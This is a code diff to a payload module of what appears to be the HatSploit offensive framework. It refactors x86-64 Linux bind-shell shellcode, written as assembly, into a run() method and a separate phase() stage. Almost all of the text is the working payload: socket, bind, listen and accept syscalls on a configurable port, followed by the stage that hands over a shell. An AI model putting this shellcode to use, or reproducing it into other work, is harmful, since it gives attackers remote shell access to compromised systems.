@@ -26,42 +26,10 @@ class HatSploitPayload(Payload, Assembler, Socket):
             'Actions': ['phaseless']
         }
 
-    def run(self):
-        bport = self.pack_port(self.handler['BPORT'])
-
+    def phase(self):
         return self.assemble(
             self.details['Architecture'],
-            f"""
-            start:
-                push 0x29
-                pop rax
-                cdq
-                push 0x2
-                pop rdi
-                push 0x1
-                pop rsi
-                syscall
-
-                xchg rdi, rax
-                push rdx
-                mov dword ptr [rsp], 0x{bport.hex()}0002
-                mov rsi, rsp
-                push 0x10
-                pop rdx
-                push 0x31
-                pop rax
-                syscall
-
-                push 0x32
-                pop rax
-                syscall
-
-                xor rsi, rsi
-                push 0x2b
-                pop rax
-                syscall
-
-                xchg rdi, rax
+            """
                 push 0x3
                 pop rsi
 
@@ -82,5 +50,46 @@ class HatSploitPayload(Payload, Assembler, Socket):
                 push rdi
                 mov rsi, rsp
                 syscall
+            """
+        )
+
+    def run(self):
+        port = self.pack_port(self.handler['BPORT'])
+
+        return self.assemble(
+            self.details['Architecture'],
+            f"""
+            start:
+                push 0x29
+                pop rax
+                cdq
+                push 0x2
+                pop rdi
+                push 0x1
+                pop rsi
+                syscall
+
+                xchg rdi, rax
+                push rdx
+                mov dword ptr [rsp], 0x{port.hex()}0002
+                mov rsi, rsp
+                push 0x10
+                pop rdx
+                push 0x31
+                pop rax
+                syscall
+
+                push 0x32
+                pop rax
+                syscall
+
+                xor rsi, rsi
+                push 0x2b
+                pop rax
+                syscall
+
+                xchg rdi, rax
+
+                {self.phase()}
             """
         )
